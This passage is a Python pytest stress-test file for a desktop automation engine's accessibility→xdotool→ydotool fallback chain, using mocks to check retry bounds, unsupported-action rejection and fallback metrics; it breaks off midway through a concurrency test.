"""Phase 5 — Hybrid Engine Fallback Stress Tests.

Three-stage fallback cascade: accessibility → xdotool → ydotool.
50-iteration loop switching between desktop apps.

Verifies:
  - No "Unsupported action" errors
  - Fallback chain works correctly (a11y → xdotool → ydotool)
  - No infinite retry loops (bounded call counts)

Run with:
    pytest tests/stress/test_phase5_hybrid_fallback_stress.py -v -m phase5
"""

from __future__ import annotations

import asyncio
import random
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List
from unittest.mock import AsyncMock, MagicMock, call, patch

import pytest

from backend.config import config
from backend.engine_capabilities import EngineCapabilities
from backend.models import ActionType, AgentAction
from backend.agent.executor import execute_action
from backend.engines.desktop_hybrid_engine import (
    execute_desktop_hybrid_action,
    _is_recoverable,
    _validate,
    _SUPPORTED_ACTIONS,
)

from tests.stress.helpers import (
    DESKTOP_ENGINES,
    ENGINE_MODES,
    STRESS,
    StressMetrics,
    make_click_action,
    make_key_action,
    make_type_action,
    run_async,
)

# ── Constants ─────────────────────────────────────────────────────────────────

HYBRID_LOOP_CYCLES = 50

# App-switching cycle: open_app → click → type → key(Enter) → close_window
# Simulates switching between 4 desktop apps in rotation.
_APPS = ["gedit", "xfce4-terminal", "nautilus", "calculator"]

_APP_SWITCH_ACTIONS = [
    ("open_app",      {"text": "APP_PLACEHOLDER"}),
    ("click",         {"coordinates": [400, 300]}),
    ("type",          {"text": "HYBRID STRESS TEST"}),
    ("key",           {"text": "Return"}),
    ("close_window",  {"text": "APP_PLACEHOLDER"}),
]

# Well-known recoverable error messages (xdotool failures → ydotool fallback)
_RECOVERABLE_MESSAGES = [
    "X11 display connection lost",
    "focus error on target window",
    "window not found: gedit",
    "BadWindow (invalid Window parameter)",
    "cannot open display :0",
    "xdotool execution failed with timeout",
    "no such window 0x12345",
    "xdotool error: permission denied",
    "Unsupported action for xdotool",
    "operation timed out after 5s",
]

# Non-recoverable error messages (should NOT trigger ydotool fallback)
_NON_RECOVERABLE_MESSAGES = [
    "Out of memory",
    "Segmentation fault",
    "Kernel panic",
    "Internal server error: 500",
    "Configuration missing",
    "Invalid action payload",
    "Rate limit exceeded",
]

# ── Autouse: zero action delay ───────────────────────────────────────────────

@pytest.fixture(autouse=True)
def _zero_action_delay():
    """Eliminate post-action sleep in the executor for fast stress tests."""
    original = config.action_delay_ms
    config.action_delay_ms = 0
    yield
    config.action_delay_ms = original


# ── Hybrid-specific metrics ──────────────────────────────────────────────────

@dataclass
class HybridFallbackMetrics:
    """Extended metrics tracking hybrid fallback behaviour."""

    total_actions: int = 0
    successful: int = 0
    failed: int = 0
    latencies_ms: List[float] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)

    # Fallback-specific counters
    xdotool_direct_success: int = 0
    ydotool_fallback_success: int = 0
    both_failed: int = 0
    unsupported_action_errors: int = 0
    validation_errors: int = 0

    # Cascade counters (a11y → xdotool → ydotool)
    a11y_success: int = 0
    a11y_fail_xdotool_success: int = 0
    a11y_fail_xdotool_fail_ydotool_success: int = 0
    full_cascade_fail: int = 0

    @property
    def success_rate(self) -> float:
        return self.successful / max(self.total_actions, 1)

    @property
    def fallback_rate(self) -> float:
        """Fraction of successful actions that required ydotool fallback."""
        total_success = self.xdotool_direct_success + self.ydotool_fallback_success
        if total_success == 0:
            return 0.0
        return self.ydotool_fallback_success / total_success

    @property
    def avg_latency_ms(self) -> float:
        return sum(self.latencies_ms) / max(len(self.latencies_ms), 1)

    def classify_hybrid_result(self, result: dict, elapsed_ms: float):
        """Classify and record a hybrid engine result."""
        self.total_actions += 1
        self.latencies_ms.append(elapsed_ms)

        if result.get("success"):
            self.successful += 1
            if result.get("fallback_used"):
                self.ydotool_fallback_success += 1
            else:
                self.xdotool_direct_success += 1
        else:
            self.failed += 1
            msg = result.get("message", "")
            self.errors.append(msg)

            if "Unsupported action" in msg:
                self.unsupported_action_errors += 1
            elif result.get("error", {}).get("type") == "validation":
                self.validation_errors += 1
            elif result.get("error", {}).get("type") == "both_failed":
                self.both_failed += 1


# ── Async helpers ─────────────────────────────────────────────────────────────

import backend.engines.desktop_hybrid_engine as _hybrid_mod


async def _timed_hybrid_dispatch(
    action: str,
    text: str = "",
    target: str = "",
    coordinates: list[int] | None = None,
) -> dict:
    """Call execute_desktop_hybrid_action and measure wall-clock time."""
    t0 = time.perf_counter()
    result = await _hybrid_mod.execute_desktop_hybrid_action(
        action=action, text=text, target=target, coordinates=coordinates,
    )
    elapsed = (time.perf_counter() - t0) * 1000
    result["_elapsed_ms"] = elapsed
    return result


async def _timed_executor_dispatch(
    action_dict: dict, engine: str = "desktop_hybrid",
) -> dict:
    """Call the executor's execute_action and measure wall-clock time."""
    mode = ENGINE_MODES.get(engine, "desktop")
    t0 = time.perf_counter()
    result = await execute_action(action_dict, mode=mode, engine=engine)
    elapsed = (time.perf_counter() - t0) * 1000
    result["_elapsed_ms"] = elapsed
    return result


def _build_cycle_actions(app_name: str) -> List[Dict[str, Any]]:
    """Build the 5-action app-switching cycle for a given app."""
    cycle = []
    for act_name, params in _APP_SWITCH_ACTIONS:
        action_dict: Dict[str, Any] = {"action": act_name}
        for k, v in params.items():
            if isinstance(v, str) and v == "APP_PLACEHOLDER":
                action_dict[k] = app_name
            else:
                action_dict[k] = v
        cycle.append(action_dict)
    return cycle


# ── Accessibility → Hybrid cascade helper ─────────────────────────────────────

import backend.engines.accessibility_engine as _a11y_mod


async def _cascade_a11y_then_hybrid(
    action: str,
    text: str = "",
    target: str = "",
    coordinates: list[int] | None = None,
) -> dict:
    """Simulate the 3-stage fallback: a11y → xdotool → ydotool.

    1. Try accessibility engine first.
    2. If it fails, delegate to desktop_hybrid (xdotool → ydotool).
    Returns the result from whichever stage succeeds (or final failure).
    """
    # Stage 1: accessibility
    try:
        a11y_result = await _a11y_mod.execute_accessibility_action(
            action=action, text=text, target=target,
        )
        if a11y_result.get("success"):
            a11y_result["_cascade_stage"] = "omni_accessibility"
            return a11y_result
    except Exception as exc:
        a11y_result = {"success": False, "message": str(exc)}

    # Stage 2+3: desktop_hybrid (xdotool → ydotool internally)
    hybrid_result = await _hybrid_mod.execute_desktop_hybrid_action(
        action=action, text=text, target=target, coordinates=coordinates,
    )
    if hybrid_result.get("success"):
        if hybrid_result.get("fallback_used"):
            hybrid_result["_cascade_stage"] = "ydotool"
        else:
            hybrid_result["_cascade_stage"] = "xdotool"
    else:
        hybrid_result["_cascade_stage"] = "all_failed"
    return hybrid_result


# ═══════════════════════════════════════════════════════════════════════════════
# TEST CLASSES
# ═══════════════════════════════════════════════════════════════════════════════


@pytest.mark.stress
@pytest.mark.phase5
class TestHybridFallbackBasic:
    """Core xdotool → ydotool fallback mechanics."""

    def test_xdotool_success_no_fallback(self):
        """When xdotool succeeds, ydotool is never tried."""
        send_mock = AsyncMock(return_value={"success": True, "message": "OK"})

        with patch.object(_hybrid_mod, "_send_action", send_mock):
            for i in range(HYBRID_LOOP_CYCLES):
                result = run_async(
                    _timed_hybrid_dispatch("click", coordinates=[100, 200])
                )
                assert result["success"] is True
                assert result["fallback_used"] is False
                assert result.get("fallback_engine") is None

        # _send_action called once per iteration (xdotool only)
        assert send_mock.call_count == HYBRID_LOOP_CYCLES

    def test_recoverable_triggers_ydotool_fallback(self):
        """When xdotool fails with a recoverable error, ydotool is tried."""
        call_idx = 0

        async def _side_effect(payload: dict) -> dict:
            nonlocal call_idx
            call_idx += 1
            if payload.get("mode") == "desktop":
                # xdotool fails with recoverable error
                return {"success": False, "message": "X11 display connection lost"}
            else:
                # ydotool succeeds
                return {"success": True, "message": "ydotool OK"}

        send_mock = AsyncMock(side_effect=_side_effect)
        metrics = HybridFallbackMetrics()

        with patch.object(_hybrid_mod, "_send_action", send_mock):
            for i in range(HYBRID_LOOP_CYCLES):
                result = run_async(
                    _timed_hybrid_dispatch("click", coordinates=[100, 200])
                )
                metrics.classify_hybrid_result(result, result.get("_elapsed_ms", 0))

        # Every action used fallback
        assert metrics.ydotool_fallback_success == HYBRID_LOOP_CYCLES
        assert metrics.xdotool_direct_success == 0
        assert metrics.success_rate == 1.0
        # xdotool + ydotool = 2 calls per iteration
        assert send_mock.call_count == HYBRID_LOOP_CYCLES * 2

    def test_non_recoverable_no_fallback(self):
        """Non-recoverable xdotool error → no ydotool fallback."""
        send_mock = AsyncMock(
            return_value={"success": False, "message": "Segmentation fault"}
        )
        metrics = HybridFallbackMetrics()

        with patch.object(_hybrid_mod, "_send_action", send_mock):
            for i in range(HYBRID_LOOP_CYCLES):
                result = run_async(
                    _timed_hybrid_dispatch("click", coordinates=[100, 200])
                )
                metrics.classify_hybrid_result(result, result.get("_elapsed_ms", 0))

        assert metrics.failed == HYBRID_LOOP_CYCLES
        assert metrics.ydotool_fallback_success == 0
        # Only xdotool attempted (no fallback)
        assert send_mock.call_count == HYBRID_LOOP_CYCLES

    def test_both_engines_fail(self):
        """Both xdotool (recoverable) and ydotool fail → both_failed error."""

        async def _both_fail(payload: dict) -> dict:
            if payload.get("mode") == "desktop":
                return {"success": False, "message": "xdotool error: focus lost"}
            return {"success": False, "message": "ydotool device not found"}

        send_mock = AsyncMock(side_effect=_both_fail)
        metrics = HybridFallbackMetrics()

        with patch.object(_hybrid_mod, "_send_action", send_mock):
            for i in range(HYBRID_LOOP_CYCLES):
                result = run_async(
                    _timed_hybrid_dispatch("click", coordinates=[100, 200])
                )
                metrics.classify_hybrid_result(result, result.get("_elapsed_ms", 0))

        assert metrics.failed == HYBRID_LOOP_CYCLES
        assert metrics.both_failed == HYBRID_LOOP_CYCLES
        assert metrics.unsupported_action_errors == 0
        # Total calls: 2 per iteration (xdotool + ydotool)
        assert send_mock.call_count == HYBRID_LOOP_CYCLES * 2


@pytest.mark.stress
@pytest.mark.phase5
class TestA11yCascadeFallback:
    """Full 3-stage cascade: accessibility → xdotool → ydotool."""

    def test_a11y_success_no_cascade(self):
        """When accessibility succeeds, no hybrid fallback is needed."""
        a11y_mock = AsyncMock(
            return_value={"success": True, "message": "A11Y OK", "engine": "omni_accessibility"}
        )
        send_mock = AsyncMock()  # Should not be called

        with patch.object(_a11y_mod, "execute_accessibility_action", a11y_mock), \
             patch.object(_hybrid_mod, "_send_action", send_mock):
            for i in range(HYBRID_LOOP_CYCLES):
                result = run_async(
                    _cascade_a11y_then_hybrid(
                        "click", text="", target="button", coordinates=[100, 200],
                    )
                )
                assert result["success"] is True
                assert result["_cascade_stage"] == "omni_accessibility"

        assert a11y_mock.call_count == HYBRID_LOOP_CYCLES
        assert send_mock.call_count == 0  # Hybrid never called

    def test_a11y_fail_xdotool_success(self):
        """Accessibility fails → xdotool succeeds (stage 2)."""
        a11y_mock = AsyncMock(
            return_value={"success": False, "message": "AT-SPI tree unavailable"}
        )
        send_mock = AsyncMock(
            return_value={"success": True, "message": "xdotool OK"}
        )
        metrics = HybridFallbackMetrics()

        with patch.object(_a11y_mod, "execute_accessibility_action", a11y_mock), \
             patch.object(_hybrid_mod, "_send_action", send_mock):
            for i in range(HYBRID_LOOP_CYCLES):
                result = run_async(
                    _cascade_a11y_then_hybrid(
                        "click", text="", target="button", coordinates=[100, 200],
                    )
                )
                assert result["_cascade_stage"] == "xdotool"
                metrics.classify_hybrid_result(result, 0)

        assert metrics.xdotool_direct_success == HYBRID_LOOP_CYCLES
        # a11y called N times, _send_action called N times (xdotool only)
        assert a11y_mock.call_count == HYBRID_LOOP_CYCLES
        assert send_mock.call_count == HYBRID_LOOP_CYCLES

    def test_a11y_fail_xdotool_fail_ydotool_success(self):
        """Full cascade: a11y fails → xdotool fails (recoverable) → ydotool succeeds."""
        a11y_mock = AsyncMock(
            return_value={"success": False, "message": "D-Bus connection refused"}
        )

        async def _xdotool_fail_ydotool_ok(payload: dict) -> dict:
            if payload.get("mode") == "desktop":
                return {"success": False, "message": "X11 connection error"}
            return {"success": True, "message": "ydotool OK"}

        send_mock = AsyncMock(side_effect=_xdotool_fail_ydotool_ok)
        metrics = HybridFallbackMetrics()

        with patch.object(_a11y_mod, "execute_accessibility_action", a11y_mock), \
             patch.object(_hybrid_mod, "_send_action", send_mock):
            for i in range(HYBRID_LOOP_CYCLES):
                result = run_async(
                    _cascade_a11y_then_hybrid(
                        "click", text="", target="button", coordinates=[100, 200],
                    )
                )
                assert result["_cascade_stage"] == "ydotool"
                assert result["fallback_used"] is True
                metrics.classify_hybrid_result(result, 0)

        assert metrics.ydotool_fallback_success == HYBRID_LOOP_CYCLES
        assert a11y_mock.call_count == HYBRID_LOOP_CYCLES
        # 2 _send_action calls per iteration (xdotool + ydotool)
        assert send_mock.call_count == HYBRID_LOOP_CYCLES * 2

    def test_full_cascade_all_fail(self):
        """All three stages fail → detailed error returned."""
        a11y_mock = AsyncMock(
            return_value={"success": False, "message": "GIR import error"}
        )

        async def _all_fail(payload: dict) -> dict:
            if payload.get("mode") == "desktop":
                return {"success": False, "message": "xdotool error: connection lost"}
            return {"success": False, "message": "ydotool: device unavailable"}

        send_mock = AsyncMock(side_effect=_all_fail)

        with patch.object(_a11y_mod, "execute_accessibility_action", a11y_mock), \
             patch.object(_hybrid_mod, "_send_action", send_mock):
            for i in range(HYBRID_LOOP_CYCLES):
                result = run_async(
                    _cascade_a11y_then_hybrid(
                        "click", text="", target="button", coordinates=[100, 200],
                    )
                )
                assert result["success"] is False
                assert result["_cascade_stage"] == "all_failed"
                assert result["fallback_used"] is True  # ydotool was attempted

    def test_intermittent_cascade_stages(self):
        """Randomly fail at different cascade stages over 50 iterations."""
        call_counter = {"a11y": 0, "total": 0}

        async def _random_a11y(*args, **kwargs) -> dict:
            call_counter["a11y"] += 1
            if random.random() < 0.4:  # 40% a11y success
                return {"success": True, "message": "A11Y OK", "engine": "omni_accessibility"}
            return {"success": False, "message": "AT-SPI timeout"}

        async def _random_hybrid(payload: dict) -> dict:
            call_counter["total"] += 1
            if payload.get("mode") == "desktop":
                if random.random() < 0.5:  # 50% xdotool success
                    return {"success": True, "message": "xdotool OK"}
                return {"success": False, "message": "xdotool error: focus lost"}
            # ydotool always succeeds as final fallback
            return {"success": True, "message": "ydotool OK"}

        a11y_mock = AsyncMock(side_effect=_random_a11y)
        send_mock = AsyncMock(side_effect=_random_hybrid)

        cascade_stages = {"omni_accessibility": 0, "xdotool": 0, "ydotool": 0, "all_failed": 0}

        with patch.object(_a11y_mod, "execute_accessibility_action", a11y_mock), \
             patch.object(_hybrid_mod, "_send_action", send_mock):
            for i in range(HYBRID_LOOP_CYCLES):
                result = run_async(
                    _cascade_a11y_then_hybrid(
                        "click", text="", target="button", coordinates=[100, 200],
                    )
                )
                stage = result["_cascade_stage"]
                cascade_stages[stage] += 1

        total = sum(cascade_stages.values())
        assert total == HYBRID_LOOP_CYCLES
        # With 40% a11y success, we should see some a11y hits
        # ydotool always succeeds as fallback → no all_failed
        assert cascade_stages["all_failed"] == 0
        # At least some diversity in stages (not all in one bucket)
        non_zero_stages = sum(1 for v in cascade_stages.values() if v > 0)
        assert non_zero_stages >= 2, f"Expected cascade diversity: {cascade_stages}"


@pytest.mark.stress
@pytest.mark.phase5
class TestAppSwitchingLoop:
    """50-iteration app-switching loop with hybrid fallback."""

    def test_50_cycle_app_switch_direct_success(self):
        """50 cycles × 5 actions, xdotool always succeeds → 0 fallbacks."""
        send_mock = AsyncMock(return_value={"success": True, "message": "OK"})
        metrics = HybridFallbackMetrics()

        with patch.object(_hybrid_mod, "_send_action", send_mock):
            for cycle_idx in range(HYBRID_LOOP_CYCLES):
                app = _APPS[cycle_idx % len(_APPS)]
                actions = _build_cycle_actions(app)
                for act in actions:
                    result = run_async(_timed_hybrid_dispatch(
                        action=act["action"],
                        text=act.get("text", ""),
                        target=act.get("target", ""),
                        coordinates=act.get("coordinates"),
                    ))
                    metrics.classify_hybrid_result(result, result.get("_elapsed_ms", 0))

        total_actions = HYBRID_LOOP_CYCLES * len(_APP_SWITCH_ACTIONS)
        assert metrics.total_actions == total_actions
        assert metrics.success_rate == 1.0
        assert metrics.fallback_rate == 0.0
        assert metrics.unsupported_action_errors == 0

    def test_50_cycle_app_switch_with_intermittent_fallback(self):
        """50 cycles with ~30% xdotool recoverable failures → ydotool fallback."""

        async def _intermittent(payload: dict) -> dict:
            if payload.get("mode") == "desktop":
                if random.random() < 0.3:
                    return {"success": False, "message": "X11 focus error"}
                return {"success": True, "message": "xdotool OK"}
            # ydotool always succeeds
            return {"success": True, "message": "ydotool OK"}

        send_mock = AsyncMock(side_effect=_intermittent)
        metrics = HybridFallbackMetrics()

        with patch.object(_hybrid_mod, "_send_action", send_mock):
            for cycle_idx in range(HYBRID_LOOP_CYCLES):
                app = _APPS[cycle_idx % len(_APPS)]
                actions = _build_cycle_actions(app)
                for act in actions:
                    result = run_async(_timed_hybrid_dispatch(
                        action=act["action"],
                        text=act.get("text", ""),
                        target=act.get("target", ""),
                        coordinates=act.get("coordinates"),
                    ))
                    metrics.classify_hybrid_result(result, result.get("_elapsed_ms", 0))

        total_actions = HYBRID_LOOP_CYCLES * len(_APP_SWITCH_ACTIONS)
        assert metrics.total_actions == total_actions
        # All should succeed (ydotool always works as fallback)
        assert metrics.success_rate == 1.0
        # Some fraction should have used fallback
        assert metrics.ydotool_fallback_success > 0
        assert metrics.unsupported_action_errors == 0

    def test_50_cycle_concurrent_app_switches(self):
        """5 concurrent app-switch cycles × 10 rounds = 50 total cycles."""

        async def _ok_send(payload: dict) -> dict:
            return {"success": True, "message": "OK"}

        send_mock = AsyncMock(side_effect=_ok_send)

        async def _run_concurrent():
            all_results: List[dict] = []

            async def _run_one_cycle(app_name: str):
                results = []
                actions = _build_cycle_actions(app_name)
                for act in actions:
                    r = await _hybrid_mod.execute_desktop_hybrid_action(
                        action=act["action"],
                        text=act.get("text", ""),
                        target=act.get("target", ""),
                        coordinates=act.get("coordinates"),
                    )
                    results.append(r)
                return results

            for round_idx in range(10):
                tasks = [
                    _run_one_cycle(_APPS[i % len(_APPS)])
                    for i in range(5)
                ]
                round_results = await asyncio.gather(*tasks)
                for batch in round_results:
                    all_results.extend(batch)

            return all_results

        with patch.object(_hybrid_mod, "_send_action", send_mock):
            results = run_async(_run_concurrent())

        assert len(results) == 50 * len(_APP_SWITCH_ACTIONS)
        # All should succeed
        assert all(r["success"] for r in results)
        # No unsupported action errors
        assert not any("Unsupported action" in r.get("message", "") for r in results)


@pytest.mark.stress
@pytest.mark.phase5
class TestUnsupportedActionRejection:
    """Ensure no 'Unsupported action' leaks during stress runs."""

    def test_all_supported_actions_accepted(self):
        """Every action in _SUPPORTED_ACTIONS passes validation."""
        for action in _SUPPORTED_ACTIONS:
            err = _validate(action, [100, 200], "test text")
            if err is not None:
                # Some actions may require coordinates, some text — the point is
                # the action name itself is NOT rejected as "Unsupported".
                assert "Unsupported action" not in err.get("message", ""), \
                    f"Action {action!r} wrongly rejected as unsupported"

    def test_truly_unsupported_rejected_cleanly(self):
        """Fabricated action names are rejected with a clean error."""
        fake_actions = [
            "fly_to_moon", "teleport", "reboot_universe",
            "hack_mainframe", "divide_by_zero",
        ]
        for fake in fake_actions:
            err = _validate(fake, [100, 200], "test")
            assert err is not None
            assert err["success"] is False
            assert "Unsupported action" in err["message"]
            assert err["engine"] == "desktop_hybrid"

    def test_no_unsupported_during_loop(self):
        """50-cycle app-switching loop produces zero 'Unsupported action' errors."""
        send_mock = AsyncMock(return_value={"success": True, "message": "OK"})
        unsupported_count = 0

        with patch.object(_hybrid_mod, "_send_action", send_mock):
            for cycle_idx in range(HYBRID_LOOP_CYCLES):
                app = _APPS[cycle_idx % len(_APPS)]
                actions = _build_cycle_actions(app)
                for act in actions:
                    result = run_async(_timed_hybrid_dispatch(
                        action=act["action"],
                        text=act.get("text", ""),
                        target=act.get("target", ""),
                        coordinates=act.get("coordinates"),
                    ))
                    if "Unsupported action" in result.get("message", ""):
                        unsupported_count += 1

        assert unsupported_count == 0, f"Got {unsupported_count} 'Unsupported action' errors"

    def test_rapid_unsupported_injection(self):
        """Inject unsupported actions among valid ones — only fakes rejected."""
        send_mock = AsyncMock(return_value={"success": True, "message": "OK"})
        valid_actions = ["click", "type", "key", "close_window", "open_app"]
        fake_actions = ["fly", "teleport", "noop_fake"]
        mixed = []
        for i in range(HYBRID_LOOP_CYCLES):
            if i % 7 == 0:
                mixed.append(random.choice(fake_actions))
            else:
                mixed.append(random.choice(valid_actions))

        unsupported = 0
        valid_success = 0

        with patch.object(_hybrid_mod, "_send_action", send_mock):
            for act_name in mixed:
                result = run_async(_timed_hybrid_dispatch(
                    action=act_name, text="test", coordinates=[100, 200],
                ))
                if "Unsupported action" in result.get("message", ""):
                    unsupported += 1
                elif result.get("success"):
                    valid_success += 1

        expected_fake = sum(1 for i in range(HYBRID_LOOP_CYCLES) if i % 7 == 0)
        assert unsupported == expected_fake
        assert valid_success == HYBRID_LOOP_CYCLES - expected_fake


@pytest.mark.stress
@pytest.mark.phase5
class TestNoInfiniteRetryLoop:
    """Verify bounded call counts — no runaway retries."""

    def test_single_xdotool_attempt_on_success(self):
        """Successful xdotool → exactly 1 _send_action call."""
        send_mock = AsyncMock(return_value={"success": True, "message": "OK"})

        with patch.object(_hybrid_mod, "_send_action", send_mock):
            result = run_async(
                _timed_hybrid_dispatch("click", coordinates=[100, 200])
            )

        assert result["success"] is True
        assert send_mock.call_count == 1

    def test_exactly_two_calls_on_fallback(self):
        """Recoverable xdotool failure → exactly 2 _send_action calls."""

        async def _xdotool_fail_ydotool_ok(payload: dict) -> dict:
            if payload.get("mode") == "desktop":
                return {"success": False, "message": "X11 focus error"}
            return {"success": True, "message": "ydotool OK"}

        send_mock = AsyncMock(side_effect=_xdotool_fail_ydotool_ok)

        with patch.object(_hybrid_mod, "_send_action", send_mock):
            result = run_async(
                _timed_hybrid_dispatch("click", coordinates=[100, 200])
            )

        assert result["success"] is True
        assert result["fallback_used"] is True
        assert send_mock.call_count == 2

    def test_both_fail_exactly_two_attempts(self):
        """Both engines fail → still only 2 _send_action calls."""

        async def _both_fail(payload: dict) -> dict:
            if payload.get("mode") == "desktop":
                return {"success": False, "message": "xdotool error: timeout"}
            return {"success": False, "message": "ydotool: no device"}

        send_mock = AsyncMock(side_effect=_both_fail)

        with patch.object(_hybrid_mod, "_send_action", send_mock):
            result = run_async(
                _timed_hybrid_dispatch("click", coordinates=[100, 200])
            )

        assert result["success"] is False
        assert send_mock.call_count == 2  # Not 3, not 100

    def test_timing_bounded_on_persistent_failure(self):
        """Even with failures at every step, total time stays bounded."""

        async def _slow_fail(payload: dict) -> dict:
            await asyncio.sleep(0.01)  # 10ms simulated latency
            if payload.get("mode") == "desktop":
                return {"success": False, "message": "xdotool error: display lost"}
            return {"success": False, "message": "ydotool timeout"}

        send_mock = AsyncMock(side_effect=_slow_fail)

        with patch.object(_hybrid_mod, "_send_action", send_mock):
            t0 = time.perf_counter()
            for _ in range(HYBRID_LOOP_CYCLES):
                run_async(
                    _timed_hybrid_dispatch("click", coordinates=[100, 200])
                )
            total_ms = (time.perf_counter() - t0) * 1000

        # 50 iterations × 2 calls × 10ms = ~1000ms + overhead
        # Should be well under 10 seconds (no exponential retry blowup)
        assert total_ms < 10_000, f"Total time {total_ms:.0f}ms exceeds 10s bound"
        assert send_mock.call_count == HYBRID_LOOP_CYCLES * 2

    def test_no_retry_on_validation_error(self):
        """Validation errors return immediately — zero _send_action calls."""
        send_mock = AsyncMock()

        with patch.object(_hybrid_mod, "_send_action", send_mock):
            for _ in range(HYBRID_LOOP_CYCLES):
                result = run_async(
                    _timed_hybrid_dispatch("this_is_not_a_real_action")
                )
                assert result["success"] is False
                assert "Unsupported action" in result["message"]

        # No _send_action calls at all — blocked at validation
        assert send_mock.call_count == 0

    def test_call_count_linear_with_iterations(self):
        """Call count scales linearly — not exponentially — with iteration count."""

        async def _recoverable(payload: dict) -> dict:
            if payload.get("mode") == "desktop":
                return {"success": False, "message": "window not found: test"}
            return {"success": True, "message": "ydotool OK"}

        call_counts = []
        for n_iters in [10, 20, 50]:
            send_mock = AsyncMock(side_effect=_recoverable)
            with patch.object(_hybrid_mod, "_send_action", send_mock):
                for _ in range(n_iters):
                    run_async(
                        _timed_hybrid_dispatch("click", coordinates=[100, 200])
                    )
            call_counts.append(send_mock.call_count)

        # Each iteration = 2 calls (xdotool fail + ydotool success)
        assert call_counts == [20, 40, 100]


@pytest.mark.stress
@pytest.mark.phase5
class TestRecoverableDetection:
    """Stress the _is_recoverable pattern matcher."""

    def test_all_known_recoverable_patterns(self):
        """Every known recoverable message triggers fallback."""
        for msg in _RECOVERABLE_MESSAGES:
            assert _is_recoverable(msg) is True, \
                f"Expected recoverable: {msg!r}"

    def test_non_recoverable_messages(self):
        """Unknown/non-recoverable errors don't trigger fallback."""
        for msg in _NON_RECOVERABLE_MESSAGES:
            assert _is_recoverable(msg) is False, \
                f"Should NOT be recoverable: {msg!r}"

    def test_empty_error_not_recoverable(self):
        """Empty string is not recoverable."""
        assert _is_recoverable("") is False

    def test_case_insensitivity(self):
        """Recoverable patterns are case-insensitive."""
        variants = [
            "FOCUS ERROR", "Focus Error", "focus error",
            "WINDOW NOT FOUND", "Window Not Found",
            "X11 DISPLAY ERROR", "x11 display error",
        ]
        for v in variants:
            assert _is_recoverable(v) is True, \
                f"Expected recoverable (case-insensitive): {v!r}"

    def test_recoverable_detection_under_volume(self):
        """Classify 1000 random error messages without exceptions."""
        messages = _RECOVERABLE_MESSAGES + _NON_RECOVERABLE_MESSAGES
        for _ in range(1000):
            msg = random.choice(messages)
            # Must not raise
            result = _is_recoverable(msg)
            assert isinstance(result, bool)


@pytest.mark.stress
@pytest.mark.phase5
class TestFallbackMetrics:
    """Track fallback usage statistics across 50-cycle runs."""

    def test_fallback_rate_tracking(self):
        """Track exact fallback rate over 50 iterations."""
        fallback_trigger_rate = 0.4  # 40% of xdotool calls fail

        async def _partial_fail(payload: dict) -> dict:
            if payload.get("mode") == "desktop":
                if random.random() < fallback_trigger_rate:
                    return {"success": False, "message": "focus error"}
                return {"success": True, "message": "xdotool OK"}
            return {"success": True, "message": "ydotool OK"}

        send_mock = AsyncMock(side_effect=_partial_fail)
        metrics = HybridFallbackMetrics()

        with patch.object(_hybrid_mod, "_send_action", send_mock):
            for _ in range(HYBRID_LOOP_CYCLES):
                result = run_async(
                    _timed_hybrid_dispatch("click", coordinates=[100, 200])
                )
                metrics.classify_hybrid_result(result, result.get("_elapsed_ms", 0))

        # All succeed (ydotool catches recoverable failures)
        assert metrics.success_rate == 1.0
        # Fallback rate should be roughly 40% ± tolerance
        assert 0.0 < metrics.fallback_rate <= 1.0
        assert metrics.unsupported_action_errors == 0

    def test_fallback_latency_overhead(self):
        """Fallback actions take longer than direct successes."""
        direct_latencies: List[float] = []
        fallback_latencies: List[float] = []

        async def _alternating(payload: dict) -> dict:
            await asyncio.sleep(0.001)  # 1ms base latency
            if payload.get("mode") == "desktop":
                return {"success": False, "message": "X11 error"}
            await asyncio.sleep(0.001)  # Extra 1ms for ydotool
            return {"success": True, "message": "ydotool OK"}

        send_mock_fb = AsyncMock(side_effect=_alternating)
        send_mock_direct = AsyncMock(side_effect=AsyncMock(
            return_value={"success": True, "message": "OK"}
        ))

        # Measure direct successes
        with patch.object(_hybrid_mod, "_send_action", send_mock_direct):
            for _ in range(25):
                r = run_async(_timed_hybrid_dispatch("click", coordinates=[100, 200]))
                direct_latencies.append(r["_elapsed_ms"])

        # Measure fallback path
        with patch.object(_hybrid_mod, "_send_action", send_mock_fb):
            for _ in range(25):
                r = run_async(_timed_hybrid_dispatch("click", coordinates=[100, 200]))
                fallback_latencies.append(r["_elapsed_ms"])

        avg_direct = sum(direct_latencies) / len(direct_latencies)
        avg_fallback = sum(fallback_latencies) / len(fallback_latencies)
        # Fallback should be slower (≥ 2 network calls vs 1)
        assert avg_fallback > avg_direct * 0.5  # Conservative — at least not faster

    def test_mixed_success_failure_metrics_accuracy(self):
        """Metrics accurately reflect outcomes under mixed conditions."""
        call_idx = 0

        async def _mixed(payload: dict) -> dict:
            nonlocal call_idx
            call_idx += 1
            if payload.get("mode") == "desktop":
                # 50% fail with recoverable error
                if call_idx % 2 == 0:
                    return {"success": False, "message": "focus error"}
                return {"success": True, "message": "xdotool OK"}
            return {"success": True, "message": "ydotool OK"}

        send_mock = AsyncMock(side_effect=_mixed)
        metrics = HybridFallbackMetrics()

        with patch.object(_hybrid_mod, "_send_action", send_mock):
            for _ in range(HYBRID_LOOP_CYCLES):
                result = run_async(
                    _timed_hybrid_dispatch("click", coordinates=[100, 200])
                )
                metrics.classify_hybrid_result(result, result.get("_elapsed_ms", 0))

        assert metrics.total_actions == HYBRID_LOOP_CYCLES
        assert metrics.successful == HYBRID_LOOP_CYCLES  # All succeed (ydotool catches)
        assert metrics.xdotool_direct_success + metrics.ydotool_fallback_success == HYBRID_LOOP_CYCLES
        assert metrics.unsupported_action_errors == 0


@pytest.mark.stress
@pytest.mark.phase5
class TestConcurrentHybridStress:
    """Concurrent hybrid actions — no state leakage between tasks."""

    def test_concurrent_hybrid_actions_isolated(self):
        """N concurrent actions produce independent results."""

        async def _ok(payload: dict) -> dict:
            # Return a fresh dict each call
            return {"success": True, "message": f"OK-{payload.get('action')}"}

        send_mock = AsyncMock(side_effect=_ok)

        async def _run():
            tasks = []
            for i in range(20):
                tasks.append(
                    _hybrid_mod.execute_desktop_hybrid_action(
                        action="click",
                        coordinates=[100 + i, 200 + i],
                    )
                )
            return await asyncio.gather(*tasks)

        with patch.object(_hybrid_mod, "_send_action", send_mock):
            results = run_async(_run())

        assert len(results) == 20
        assert all(r["success"] for r in results)
        assert all(r["fallback_used"] is False for r in results)

    def test_concurrent_mixed_fallback(self):
        """Concurrent actions with some needing fallback — no cross-contamination."""
        call_idx = 0

        async def _mixed_concurrent(payload: dict) -> dict:
